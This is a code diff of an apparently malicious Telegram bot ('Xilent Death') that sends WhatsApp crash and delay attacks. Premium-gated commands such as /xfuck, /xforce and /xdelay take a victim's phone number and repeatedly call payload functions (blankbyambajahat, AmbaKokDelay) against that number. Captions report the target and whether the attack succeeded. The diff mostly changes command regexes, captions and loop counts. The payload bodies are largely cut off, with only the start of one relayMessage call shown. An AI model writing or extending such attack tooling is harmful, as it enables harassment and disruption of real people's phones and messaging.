@@ -4042,111 +4042,24 @@ await ctx.telegram.sendPhoto(ctx.chat.id, attackUrl, {
   }
 });
 //-------------- COMMAND BUG --------------//
-bot.hears(/^\/?(xfuck|xios)\b/i, checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
+bot.hears(/^(\/)?(xforce|xfuck|xios)(\s|$)/i, checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
+  
   const q = ctx.message.text.split(" ")[1];
   if (!q) return ctx.reply(`🪧 ☇ Format: /xfuck 62×××`);
   let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
   let mention = true;
 
-  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailBug, {
+  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, attackUrl, {
     caption: `
-<blockquote><pre>⟡━⟢ XILENT DEATH ⟣━⟡
-⌑ Target: ${q}
-⌑ Type: Blank No Click
-⌑ Status: Process
-╘═——————————————═⬡</pre></blockquote>`,
+<blockquote><b>𖤓〘 𝐗𝐢𝐥𝐞𝐧𝐭 𝐃𝐞𝐚𝐭𝐡 𝐀𝐭𝐭𝐚𝐜𝐤 〙𖤓</b></blockquote>
+𖤓 Target:  ${q}
+𖤓 Type: Hard
+𖤓 Status: Process
+<blockquote><b>𖤓〘 𝐗𝐈𝐋𝐄𝐍𝐓 𝐃𝐄𝐀𝐓𝐇 〙𖤓</b></blockquote>`,
     parse_mode: "HTML",
     reply_markup: {
       inline_keyboard: [[
-        { text: "CEK TARGET", url: `https://wa.me/${q}` }
-      ]]
-    }
-  });
-
-  const processMessageId = processMessage.message_id;
-
-  for (let i = 0; i < 20; i++) {
-    await blankbyambajahat(sock, target);
-    await sleep(1000);
-  }
-
-  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
-<blockquote><pre>⟡━⟢ XILENT DEATH ⟣━⟡l
-⌑ Target: ${q}
-⌑ Type: Blank No Click
-⌑ Status: Success
-╘═——————————————═⬡</pre></blockquote>`, {
-    parse_mode: "HTML",
-    reply_markup: {
-      inline_keyboard: [[
-        { text: "CEK TARGET", url: `https://wa.me/${q}` }
-      ]]
-    }
-  });
-});
-
-bot.hears(/^\/?(flowx|xdelay)\b/i, checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
-  const q = ctx.message.text.split(" ")[1];
-  if (!q) return ctx.reply(`🪧 ☇ Format: /xdelay 62×××`);
-  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
-  let mention = true;
-
-  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailBug, {
-    caption: `
-<blockquote><pre>⟡━⟢ XILENT DEATH ⟣━⟡
-⌑ Target: ${q}
-⌑ Type: Delay Invis
-⌑ Status: Process
-╘═——————————————═⬡</pre></blockquote>`,
-    parse_mode: "HTML",
-    reply_markup: {
-      inline_keyboard: [[
-        { text: "CEK TARGET", url: `https://wa.me/${q}` }
-      ]]
-    }
-  });
-
-  const processMessageId = processMessage.message_id;
-
-  for (let i = 0; i < 20; i++) {
-    await AmbaKokDelay(sock, target);
-    await sleep(1000);
-  }
-
-  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
-<blockquote><pre>⟡━⟢ XILENT DEATH ⟣━⟡l
-⌑ Target: ${q}
-⌑ Type: Delay Invis
-⌑ Status: Success
-╘═——————————————═⬡</pre></blockquote>`, {
-    parse_mode: "HTML",
-    reply_markup: {
-      inline_keyboard: [[
-        { text: "CEK TARGET", url: `https://wa.me/${q}` }
-      ]]
-    }
-  });
-});
-
-bot.hears(/^\/?(xforce|xblank)\b/i, checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
-  const q = ctx.message.text.split(" ")[1];
-  if (!q) return ctx.reply(`🪧 ☇ Format: /x 62×××`);
-  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
-  let mention = true;
-
-  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailBug, {
-    caption: `
-<blockquote><pre>⟡━⟢ XILENT DEATH ⟣━⟡
-⌑ Target: ${q}
-⌑ Type: -
-⌑ Low Divice: Force
-⌑ High Divice: Blank Hard
-⌑ Status: Process
-╘═——————————————═⬡</pre></blockquote>`,
-    parse_mode: "HTML",
-    reply_markup: {
-      inline_keyboard: [[
-        { text: "CEK TARGET", url: `https://wa.me/${q}` }
+        { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
       ]]
     }
   });
@@ -4155,26 +4068,67 @@ bot.hears(/^\/?(xforce|xblank)\b/i, checkWhatsAppConnection, checkPremium, check
 
   for (let i = 0; i < 2; i++) {
     await blankbyambajahat(sock, target);
-    await sleep(1000);
+    await new Promise((r) => setTimeout(r, 1000));
   }
 
   await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
-<blockquote><pre>⟡━⟢ XILENT DEATH ⟣━⟡l
-⌑ Target: ${q}
-⌑ Type: -
-⌑ Low Divice: Force
-⌑ High Divice: Blank
-⌑ Status: Success
-╘═——————————————═⬡</pre></blockquote>`, {
+<blockquote><b>𖤓〘 𝐗𝐢𝐥𝐞𝐧𝐭 𝐃𝐞𝐚𝐭𝐡 𝐀𝐭𝐭𝐚𝐜𝐤 〙𖤓</b></blockquote>
+𖤓 Target:  ${q}
+𖤓 Type: Hard
+𖤓 Status: Success
+<blockquote><b>𖤓〘 𝐗𝐈𝐋𝐄𝐍𝐓 𝐃𝐄𝐀𝐓𝐇 〙𖤓</b></blockquote>`, {
     parse_mode: "HTML",
     reply_markup: {
       inline_keyboard: [[
-        { text: "CEK TARGET", url: `https://wa.me/${q}` }
+        { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
       ]]
     }
   });
 });
 
+bot.hears(/^(\/)?(flowx|xdelay)(\s|$)/i, checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
+  
+  const q = ctx.message.text.split(" ")[1];
+  if (!q) return ctx.reply(`🪧 ☇ Format: /xfuck 62×××`);
+  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+  let mention = true;
+
+  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, attackUrl, {
+    caption: `
+<blockquote><b>𖤓〘 𝐗𝐢𝐥𝐞𝐧𝐭 𝐃𝐞𝐚𝐭𝐡 𝐀𝐭𝐭𝐚𝐜𝐤 〙𖤓</b></blockquote>
+𖤓 Target:  ${q}
+𖤓 Type: Hard
+𖤓 Status: Process
+<blockquote><b>𖤓〘 𝐗𝐈𝐋𝐄𝐍𝐓 𝐃𝐄𝐀𝐓𝐇 〙𖤓</b></blockquote>`,
+    parse_mode: "HTML",
+    reply_markup: {
+      inline_keyboard: [[
+        { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
+      ]]
+    }
+  });
+
+  const processMessageId = processMessage.message_id;
+
+  for (let i = 0; i < 10; i++) {
+    await AmbaKokDelay(sock, target);
+    await new Promise((r) => setTimeout(r, 1000));
+  }
+
+  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
+<blockquote><b>𖤓〘 𝐗𝐢𝐥𝐞𝐧𝐭 𝐃𝐞𝐚𝐭𝐡 𝐀𝐭𝐭𝐚𝐜𝐤 〙𖤓</b></blockquote>
+𖤓 Target:  ${q}
+𖤓 Type: Hard
+𖤓 Status: Success
+<blockquote><b>𖤓〘 𝐗𝐈𝐋𝐄𝐍𝐓 𝐃𝐄𝐀𝐓𝐇 〙𖤓</b></blockquote>`, {
+    parse_mode: "HTML",
+    reply_markup: {
+      inline_keyboard: [[
+        { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
+      ]]
+    }
+  });
+});
 async function AmbaKokDelay(sock, target) {
   await sock.relayMessage(target, {
     groupStatusMessageV2: { 
